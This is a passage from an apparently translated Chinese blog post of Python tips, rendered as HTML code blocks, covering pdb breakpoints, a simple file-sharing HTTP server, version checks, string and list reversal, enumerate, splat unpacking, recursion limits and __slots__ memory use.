class=\"line\">print(testSet)</div><div class=\"line\">print(testDict)</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">#set([0, 2, 4, 6, 8, 10, 12, 14, 16, 18])</span></div><div class=\"line\"><span class=\"comment\">#&#123;0: 0, 1: 1, 2: 4, 3: 9, 4: 16, 5: 25, 6: 36, 7: 49, 8: 64, 9: 81&#125;</span></div></pre></td></tr></table></figure>\n<p>注：两个语句中只有一个 &lt;:&gt; 的不同，另，在 Python3 中运行上述代码时，将 &lt;xrange&gt; 改为 &lt;range&gt;。</p>\n<h2 id=\"贴士-9-调试脚本\"><a href=\"#贴士-9-调试脚本\" class=\"headerlink\" title=\"贴士#9. 调试脚本\"></a>贴士#9. 调试脚本</h2><p>我们可以在 &lt;pdb&gt; 模块的帮助下在 Python 脚本中设置断点，下面是一个例子：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"keyword\">import</span> pdb</div><div class=\"line\">pdb.set_trace()</div></pre></td></tr></table></figure>\n<p>我们可以在脚本中任何位置指定 &lt;pdb.set_trace()&gt; 并且在那里设置一个断点，相当简便。</p>\n<h2 id=\"贴士-10-开启文件分享\"><a href=\"#贴士-10-开启文件分享\" class=\"headerlink\" title=\"贴士#10. 开启文件分享\"></a>贴士#10. 开启文件分享</h2><p>Python 允许运行一个 HTTP 服务器来从根路径共享文件，下面是开启服务器的命令：</p>\n<h3 id=\"Python-2\"><a href=\"#Python-2\" class=\"headerlink\" title=\"# Python 2\"></a># Python 2</h3><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">python -m SimpleHTTPServer</div></pre></td></tr></table></figure>\n<h3 id=\"Python-3\"><a href=\"#Python-3\" class=\"headerlink\" title=\"# Python 3\"></a># Python 3</h3><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">python3 -m http.server</div></pre></td></tr></table></figure>\n<p>上面的命令会在默认端口也就是 8000 开启一个服务器，你可以将一个自定义的端口号以最后一个参数的方式传递到上面的命令中。</p>\n<h2 id=\"贴士-11-检查-Python-中的对象\"><a href=\"#贴士-11-检查-Python-中的对象\" class=\"headerlink\" title=\"贴士#11. 检查 Python 中的对象\"></a>贴士#11. 检查 Python 中的对象</h2><p>我们可以通过调用 dir() 方法来检查 Python 中的对象，下面是一个简单的例子：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div></pre></td><td class=\"code\"><pre><div class=\"line\">test = [<span class=\"number\">1</span>, <span class=\"number\">3</span>, <span class=\"number\">5</span>, <span class=\"number\">7</span>]</div><div class=\"line\">print( dir(test) )</div><div class=\"line\"></div><div class=\"line\">[<span class=\"string\">'__add__'</span>, <span class=\"string\">'__class__'</span>, <span class=\"string\">'__contains__'</span>, <span class=\"string\">'__delattr__'</span>, <span class=\"string\">'__delitem__'</span>, <span class=\"string\">'__delslice__'</span>, <span class=\"string\">'__doc__'</span>, <span class=\"string\">'__eq__'</span>, <span class=\"string\">'__format__'</span>, <span class=\"string\">'__ge__'</span>, <span class=\"string\">'__getattribute__'</span>, <span class=\"string\">'__getitem__'</span>, <span class=\"string\">'__getslice__'</span>, <span class=\"string\">'__gt__'</span>, <span class=\"string\">'__hash__'</span>, <span class=\"string\">'__iadd__'</span>, <span class=\"string\">'__imul__'</span>, <span class=\"string\">'__init__'</span>, <span class=\"string\">'__iter__'</span>, <span class=\"string\">'__le__'</span>, <span class=\"string\">'__len__'</span>, <span class=\"string\">'__lt__'</span>, <span class=\"string\">'__mul__'</span>, <span class=\"string\">'__ne__'</span>, <span class=\"string\">'__new__'</span>, <span class=\"string\">'__reduce__'</span>, <span class=\"string\">'__reduce_ex__'</span>, <span class=\"string\">'__repr__'</span>, <span class=\"string\">'__reversed__'</span>, <span class=\"string\">'__rmul__'</span>, <span class=\"string\">'__setattr__'</span>, <span class=\"string\">'__setitem__'</span>, <span class=\"string\">'__setslice__'</span>, <span class=\"string\">'__sizeof__'</span>, <span class=\"string\">'__str__'</span>, <span class=\"string\">'__subclasshook__'</span>, <span class=\"string\">'append'</span>, <span class=\"string\">'count'</span>, <span class=\"string\">'extend'</span>, <span class=\"string\">'index'</span>, <span class=\"string\">'insert'</span>, <span class=\"string\">'pop'</span>, <span class=\"string\">'remove'</span>, <span class=\"string\">'reverse'</span>, <span class=\"string\">'sort'</span>]</div></pre></td></tr></table></figure>\n<h2 id=\"贴士-12-简化-if-语句\"><a href=\"#贴士-12-简化-if-语句\" class=\"headerlink\" title=\"贴士#12. 简化 if 语句\"></a>贴士#12. 简化 if 语句</h2><p>我们可以使用下面的方式来验证多个值：<br><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"keyword\">if</span> m <span class=\"keyword\">in</span> [<span class=\"number\">1</span>,<span class=\"number\">3</span>,<span class=\"number\">5</span>,<span class=\"number\">7</span>]:</div></pre></td></tr></table></figure></p>\n<p>而不是：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"keyword\">if</span> m==<span class=\"number\">1</span> <span class=\"keyword\">or</span> m==<span class=\"number\">3</span> <span class=\"keyword\">or</span> m==<span class=\"number\">5</span> <span class=\"keyword\">or</span> m==<span class=\"number\">7</span>:</div></pre></td></tr></table></figure>\n<p>或者，对于 in 操作符我们也可以使用 ‘{1,3,5,7}’ 而不是 ‘[1,3,5,7]’，因为 set 中取元素是 O(1) 操作。</p>\n<h2 id=\"贴士-13-运行时检测-Python-版本\"><a href=\"#贴士-13-运行时检测-Python-版本\" class=\"headerlink\" title=\"贴士#13. 运行时检测 Python 版本\"></a>贴士#13. 运行时检测 Python 版本</h2><p>当正在运行的 Python 低于支持的版本时，有时我们也许不想运行我们的程序。为达到这个目标，你可以使用下面的代码片段，它也以可读的方式输出当前 Python 版本：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"keyword\">import</span> sys</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">#Detect the Python version currently in use.</span></div><div class=\"line\"><span class=\"keyword\">if</span> <span class=\"keyword\">not</span> hasattr(sys, <span class=\"string\">\"hexversion\"</span>) <span class=\"keyword\">or</span> sys.hexversion != <span class=\"number\">50660080</span>:</div><div class=\"line\">    print(<span class=\"string\">\"Sorry, you aren't running on Python 3.5n\"</span>)</div><div class=\"line\">    print(<span class=\"string\">\"Please upgrade to 3.5.n\"</span>)</div><div class=\"line\">    sys.exit(<span class=\"number\">1</span>)</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">#Print Python version in a readable format.</span></div><div class=\"line\">print(<span class=\"string\">\"Current Python version: \"</span>, sys.version)</div></pre></td></tr></table></figure>\n<p>或者你可以使用 sys.version_info &gt;= (3, 5) 来替换上面代码中的 sys.hexversion != 50660080，这是一个读者的建议。</p>\n<p>在 Python 2.7 上运行的结果：</p>\n<figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div></pre></td><td class=\"code\"><pre><div class=\"line\"></div><div class=\"line\">Python 2.7.10 (default, Jul 14 2015, 19:46:27)</div><div class=\"line\">[GCC 4.8.2] on linux</div><div class=\"line\"></div><div class=\"line\">Sorry, you aren't running on Python 3.5</div><div class=\"line\"></div><div class=\"line\">Please upgrade to 3.5.</div></pre></td></tr></table></figure>\n<p>在 Python 3.5 上运行的结果：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div></pre></td><td class=\"code\"><pre><div class=\"line\"></div><div class=\"line\">Python <span class=\"number\">3.5</span><span class=\"number\">.1</span> (default, Dec <span class=\"number\">2015</span>, <span class=\"number\">13</span>:<span class=\"number\">05</span>:<span class=\"number\">11</span>)</div><div class=\"line\">[GCC <span class=\"number\">4.8</span><span class=\"number\">.2</span>] on linux</div><div class=\"line\"></div><div class=\"line\">Current Python version:  <span class=\"number\">3.5</span><span class=\"number\">.2</span> (default, Aug <span class=\"number\">22</span> <span class=\"number\">2016</span>, <span class=\"number\">21</span>:<span class=\"number\">11</span>:<span class=\"number\">05</span>) </div><div class=\"line\">[GCC <span class=\"number\">5.3</span><span class=\"number\">.0</span>]</div></pre></td></tr></table></figure>\n<h2 id=\"贴士-14-组合多个字符串\"><a href=\"#贴士-14-组合多个字符串\" class=\"headerlink\" title=\"贴士#14. 组合多个字符串\"></a>贴士#14. 组合多个字符串</h2><p>如果你想拼接列表中的所有记号，比如下面的例子：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>test = [<span class=\"string\">'I'</span>, <span class=\"string\">'Like'</span>, <span class=\"string\">'Python'</span>, <span class=\"string\">'automation'</span>]</div></pre></td></tr></table></figure>\n<p>现在，让我们从上面给出的列表元素新建一个字符串：<br><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span><span class=\"keyword\">print</span> <span class=\"string\">''</span>.join(test)</div></pre></td></tr></table></figure></p>\n<h2 id=\"贴士-15-四种翻转字符串-列表的方式\"><a href=\"#贴士-15-四种翻转字符串-列表的方式\" class=\"headerlink\" title=\"贴士#15. 四种翻转字符串/列表的方式\"></a>贴士#15. 四种翻转字符串/列表的方式</h2><h3 id=\"翻转列表本身\"><a href=\"#翻转列表本身\" class=\"headerlink\" title=\"# 翻转列表本身\"></a># 翻转列表本身</h3><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div></pre></td><td class=\"code\"><pre><div class=\"line\">testList = [<span class=\"number\">1</span>, <span class=\"number\">3</span>, <span class=\"number\">5</span>]</div><div class=\"line\">testList.reverse()</div><div class=\"line\">print(testList)</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">#-&gt; [5, 3, 1]</span></div></pre></td></tr></table></figure>\n<h3 id=\"在一个循环中翻转并迭代输出\"><a href=\"#在一个循环中翻转并迭代输出\" class=\"headerlink\" title=\"# 在一个循环中翻转并迭代输出\"></a># 在一个循环中翻转并迭代输出</h3><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"keyword\">for</span> element <span class=\"keyword\">in</span> reversed([<span class=\"number\">1</span>,<span class=\"number\">3</span>,<span class=\"number\">5</span>]):</div><div class=\"line\">    print(element)</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">#1-&gt; 5</span></div><div class=\"line\"><span class=\"comment\">#2-&gt; 3</span></div><div class=\"line\"><span class=\"comment\">#3-&gt; 1</span></div></pre></td></tr></table></figure>\n<h3 id=\"一行代码翻转字符串\"><a href=\"#一行代码翻转字符串\" class=\"headerlink\" title=\"# 一行代码翻转字符串\"></a># 一行代码翻转字符串</h3><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"string\">\"Test Python\"</span>[::<span class=\"number\">-1</span>]</div></pre></td></tr></table></figure>\n<p>输出为 “nohtyP tseT”</p>\n<h3 id=\"使用切片翻转列表\"><a href=\"#使用切片翻转列表\" class=\"headerlink\" title=\"# 使用切片翻转列表\"></a># 使用切片翻转列表</h3><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">[<span class=\"number\">1</span>, <span class=\"number\">3</span>, <span class=\"number\">5</span>][::<span class=\"number\">-1</span>]</div></pre></td></tr></table></figure>\n<p>上面的命令将会给出输出 [5,3,1]。</p>\n<h2 id=\"贴士-16-玩转枚举\"><a href=\"#贴士-16-玩转枚举\" class=\"headerlink\" title=\"#贴士#16. 玩转枚举\"></a>#贴士#16. 玩转枚举</h2><p>使用枚举可以在循环中方便地找到（当前的）索引：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div></pre></td><td class=\"code\"><pre><div class=\"line\">testlist = [<span class=\"number\">10</span>, <span class=\"number\">20</span>, <span class=\"number\">30</span>]</div><div class=\"line\"><span class=\"keyword\">for</span> i, value <span class=\"keyword\">in</span> enumerate(testlist):</div><div class=\"line\">    print(i, <span class=\"string\">': '</span>, value)</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">#1-&gt; 0 : 10</span></div><div class=\"line\"><span class=\"comment\">#2-&gt; 1 : 20</span></div><div class=\"line\"><span class=\"comment\">#3-&gt; 2 : 30</span></div></pre></td></tr></table></figure>\n<h2 id=\"贴士-17-在-Python-中使用枚举量\"><a href=\"#贴士-17-在-Python-中使用枚举量\" class=\"headerlink\" title=\"贴士#17. 在 Python 中使用枚举量\"></a>贴士#17. 在 Python 中使用枚举量</h2><p>我们可以使用下面的方式来定义枚举量：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Shapes</span>:</span></div><div class=\"line\">    Circle, Square, Triangle, Quadrangle = range(<span class=\"number\">4</span>)</div><div class=\"line\"></div><div class=\"line\">print(Shapes.Circle)</div><div class=\"line\">print(Shapes.Square)</div><div class=\"line\">print(Shapes.Triangle)</div><div class=\"line\">print(Shapes.Quadrangle)</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">#1-&gt; 0</span></div><div class=\"line\"><span class=\"comment\">#2-&gt; 1</span></div><div class=\"line\"><span class=\"comment\">#3-&gt; 2</span></div><div class=\"line\"><span class=\"comment\">#4-&gt; 3</span></div></pre></td></tr></table></figure>\n<h2 id=\"贴士-18-从方法中返回多个值\"><a href=\"#贴士-18-从方法中返回多个值\" class=\"headerlink\" title=\"贴士#18. 从方法中返回多个值\"></a>贴士#18. 从方法中返回多个值</h2><p>并没有太多编程语言支持这个特性，然而 Python 中的方法确实（可以）返回多个值，请参见下面的例子来看看这是如何工作的：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\"># function returning multiple values.</span></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">x</span><span class=\"params\">()</span>:</span></div><div class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">1</span>, <span class=\"number\">2</span>, <span class=\"number\">3</span>, <span class=\"number\">4</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\"># Calling the above function.</span></div><div class=\"line\">a, b, c, d = x()</div><div class=\"line\"></div><div class=\"line\">print(a, b, c, d)</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">#-&gt; 1 2 3 4</span></div></pre></td></tr></table></figure>\n<h2 id=\"贴士-19-使用-运算符（splat-operator）来-unpack-函数参数\"><a href=\"#贴士-19-使用-运算符（splat-operator）来-unpack-函数参数\" class=\"headerlink\" title=\"贴士#19. 使用 * 运算符（splat operator）来 unpack 函数参数\"></a>贴士#19. 使用 * 运算符（splat operator）来 unpack 函数参数</h2><ul>\n<li>运算符（splat operator）提供了一个艺术化的方法来 unpack 参数列表，为清楚起见请参见下面的例子：<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">test</span><span class=\"params\">(x, y, z)</span>:</span></div><div class=\"line\">    print(x, y, z)</div><div class=\"line\"></div><div class=\"line\">testDict = &#123;<span class=\"string\">'x'</span>: <span class=\"number\">1</span>, <span class=\"string\">'y'</span>: <span class=\"number\">2</span>, <span class=\"string\">'z'</span>: <span class=\"number\">3</span>&#125; </div><div class=\"line\">testList = [<span class=\"number\">10</span>, <span class=\"number\">20</span>, <span class=\"number\">30</span>]</div><div class=\"line\"></div><div class=\"line\">test(*testDict)</div><div class=\"line\">test(**testDict)</div><div class=\"line\">test(*testList)</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">#1-&gt; x y z</span></div><div class=\"line\"><span class=\"comment\">#2-&gt; 1 2 3</span></div><div class=\"line\"><span class=\"comment\">#3-&gt; 10 20 30</span></div></pre></td></tr></table></figure>\n</li>\n</ul>\n<h2 id=\"贴士-20-使用字典来存储选择操作\"><a href=\"#贴士-20-使用字典来存储选择操作\" class=\"headerlink\" title=\"贴士#20. 使用字典来存储选择操作\"></a>贴士#20. 使用字典来存储选择操作</h2><p>我们能构造一个字典来存储表达式：<br><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div></pre></td><td class=\"code\"><pre><div class=\"line\">stdcalc = &#123;</div><div class=\"line\">    <span class=\"string\">'sum'</span>: <span class=\"keyword\">lambda</span> x, y: x + y,</div><div class=\"line\">    <span class=\"string\">'subtract'</span>: <span class=\"keyword\">lambda</span> x, y: x - y</div><div class=\"line\">&#125;</div><div class=\"line\"></div><div class=\"line\">print(stdcalc[<span class=\"string\">'sum'</span>](<span class=\"number\">9</span>,<span class=\"number\">3</span>))</div><div class=\"line\">print(stdcalc[<span class=\"string\">'subtract'</span>](<span class=\"number\">9</span>,<span class=\"number\">3</span>))</div></pre></td></tr></table></figure></p>\n<h2 id=\"贴士-21-一行代码计算任何数的阶乘\"><a href=\"#贴士-21-一行代码计算任何数的阶乘\" class=\"headerlink\" title=\"贴士#21. 一行代码计算任何数的阶乘\"></a>贴士#21. 一行代码计算任何数的阶乘</h2><h3 id=\"Python-2-x\"><a href=\"#Python-2-x\" class=\"headerlink\" title=\"Python 2.x.\"></a>Python 2.x.</h3><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div></pre></td><td class=\"code\"><pre><div class=\"line\">result = (<span class=\"keyword\">lambda</span> k: reduce(int.__mul__, range(<span class=\"number\">1</span>,k+<span class=\"number\">1</span>),<span class=\"number\">1</span>))(<span class=\"number\">3</span>)</div><div class=\"line\">print(result)</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">#-&gt; 6</span></div></pre></td></tr></table></figure>\n<h3 id=\"Python-3-x\"><a href=\"#Python-3-x\" class=\"headerlink\" title=\"Python 3.x.\"></a>Python 3.x.</h3><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"keyword\">import</span> functools</div><div class=\"line\">result = (<span class=\"keyword\">lambda</span> k: functools.reduce(int.__mul__, range(<span class=\"number\">1</span>,k+<span class=\"number\">1</span>),<span class=\"number\">1</span>))(<span class=\"number\">3</span>)</div><div class=\"line\">print(result)</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">#-&gt; 6</span></div></pre></td></tr></table></figure>\n<h2 id=\"贴士-22-找到列表中出现最频繁的数\"><a href=\"#贴士-22-找到列表中出现最频繁的数\" class=\"headerlink\" title=\"贴士#22. 找到列表中出现最频繁的数\"></a>贴士#22. 找到列表中出现最频繁的数</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div></pre></td><td class=\"code\"><pre><div class=\"line\">test = [<span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>,<span class=\"number\">4</span>,<span class=\"number\">2</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>,<span class=\"number\">1</span>,<span class=\"number\">4</span>,<span class=\"number\">4</span>,<span class=\"number\">4</span>]</div><div class=\"line\">print(max(set(test), key=test.count))</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">#-&gt; 4</span></div></pre></td></tr></table></figure>\n<h2 id=\"贴士-23-重置递归限制\"><a href=\"#贴士-23-重置递归限制\" class=\"headerlink\" title=\"贴士#23. 重置递归限制\"></a>贴士#23. 重置递归限制</h2><p>Python 限制递归次数到 1000，我们可以重置这个值：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"keyword\">import</span> sys</div><div class=\"line\"></div><div class=\"line\">x=<span class=\"number\">1001</span></div><div class=\"line\">print(sys.getrecursionlimit())</div><div class=\"line\"></div><div class=\"line\">sys.setrecursionlimit(x)</div><div class=\"line\">print(sys.getrecursionlimit())</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">#-&gt; 1000</span></div><div class=\"line\"><span class=\"comment\">#-&gt; 1001</span></div></pre></td></tr></table></figure>\n<p>请只在必要的时候采用上面的技巧。</p>\n<h2 id=\"贴士-24-检查一个对象的内存使用\"><a href=\"#贴士-24-检查一个对象的内存使用\" class=\"headerlink\" title=\"贴士#24. 检查一个对象的内存使用\"></a>贴士#24. 检查一个对象的内存使用</h2><p>在 Python 2.7 中，一个 32 比特的整数占用 24 字节，在 Python 3.5 中占用 28 字节。为确定内存使用，我们可以调用 getsizeof 方法：</p>\n<p>在 Python 2.7 中</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"keyword\">import</span> sys</div><div class=\"line\">x=<span class=\"number\">1</span></div><div class=\"line\">print(sys.getsizeof(x))</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">#-&gt; 24</span></div></pre></td></tr></table></figure>\n<p>在 Python 3.5 中</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"keyword\">import</span> sys</div><div class=\"line\">x=<span class=\"number\">1</span></div><div class=\"line\">print(sys.getsizeof(x))</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">#-&gt; 28</span></div></pre></td></tr></table></figure>\n<h2 id=\"贴士-25-使用-slots-来减少内存开支\"><a href=\"#贴士-25-使用-slots-来减少内存开支\" class=\"headerlink\" title=\"贴士#25. 使用 slots 来减少内存开支\"></a>贴士#25. 使用 <strong>slots</strong> 来减少内存开支</h2><p>你是否注意到你的 Python 应用占用许多资源特别是内存？有一个技巧是使用 <strong>slots</strong> 类变量来在一定程度上减少内存开支。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"keyword\">import</span> sys</div><div class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">FileSystem</span><span class=\"params\">(object)</span>:</span></div><div class=\"line\"></div><div class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">__init__</span><span class=\"params\">(self, files, folders, devices)</span>:</span></div><div class=\"line\">        self.files = files</div><div class=\"line\">        self.folders = folders</div><div class=\"line\">        self.devices = devices</div><div class=\"line\">print(sys.getsizeof( FileSystem ))</div><div class=\"line\"></div><div class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">FileSystem1</span><span class=\"params\">(object)</span>:</span></div><div class=\"line\"></div><div class=\"line\">    __slots__ = [<span class=\"string\">'files'</span>, <span class=\"string\">'folders'</span>, <span class=\"string\">'devices'</span>]</div><div class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">__init__</span><span class=\"params\">(self, files, folders, devices)</span>:</span></div><div class=\"line\">        self.files = files</div><div class=\"line\">        self.folders = folders</div><div class=\"line\">        self.devices = devices</div><div class=\"line\"></div><div class=\"line\">print(sys.getsizeof( FileSystem1 ))</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">#In Python 3.5</span></div><div class=\"line\"><span class=\"comment\">#1-&gt; 1016</span></div><div class=\"line\"><span class=\"comment\">#2-&gt; 888</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\"># 经测试 在我的 win10 python27 中跑出的结果是：</span></div><div class=\"line\"><span class=\"comment\">#1-&gt; 452</span></div><div class=\"line\"><span class=\"comment\">#2-&gt; 512</span></div></pre></td></tr></table></figure>\n<p>很明显，你可以从结果中看到确实有内存使用上的节省，但是你只应该在一个类的内存开销不必要得大时才使用 <strong>slots</strong>。只在对应用进行性能分析后才使用它，不然地话，你只是使得代码难以改变而没有真正的益处。</p>\n<p>所以，这种比较方式是不那么让人信服的，使用 <strong>slots</strong> 主要是用以限定对象的属性信息，另外，当生成对象很多时花销可能会小一些，具体可以参见 <a href=\"https://docs.python.org/3/reference/datamodel.html?highlight=__slots__#object.__slots__\" target=\"_blank\" rel=\"external\">python 官方文档</a>:</p>\n<p>The slots declaration takes a sequence of instance variables and reserves just enough space in each instance to hold a value for each variable. Space is saved because dict is not created for each instance. </p>\n<p>也可参考廖雪峰老师的 <a href=\"http://www.liaoxuefeng.com/wiki/001374738125095c955c1e6d8bb493182103fac9270762a000/0013868200605560b1bd3c660bf494282ede59fee17e781000\" target=\"_blank\" rel=\"external\">使用<strong>slots</strong></a> </p>\n<h2 id=\"贴士-26-使用-lambda-来模仿输出方法\"><a href=\"#贴士-26-使用-lambda-来模仿输出方法\" class=\"headerlink\" title=\"贴士#26. 使用 lambda 来模仿输出方法\"></a>贴士#26. 使用 lambda 来模仿输出方法</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"keyword\">import</span> sys</div><div class=\"line\">lprint=<span class=\"keyword\">lambda</span> *args:sys.stdout.write(<span class=\"string\">\" \"</span>.join(map(str,args)))</div><div class=\"line\">lprint(<span class=\"string\">\"python\"</span>, <span class=\"string\">\"tips\"</span>,<span class=\"number\">1000</span>,<span class=\"number\">1001</span>)</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">#-&gt; python tips 1000 1001</span></div></pre></td></tr></table></figure>\n<h2 id=\"贴士-27-从两个相关的序列构建一个字典\"><a href=\"#贴士-27-从两个相关的序列构建一个字典\" class=\"headerlink\" title=\"贴士#27. 从两个相关的序列构建一个字典\"></a>贴士#27. 从两个相关的序列构建一个字典</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div 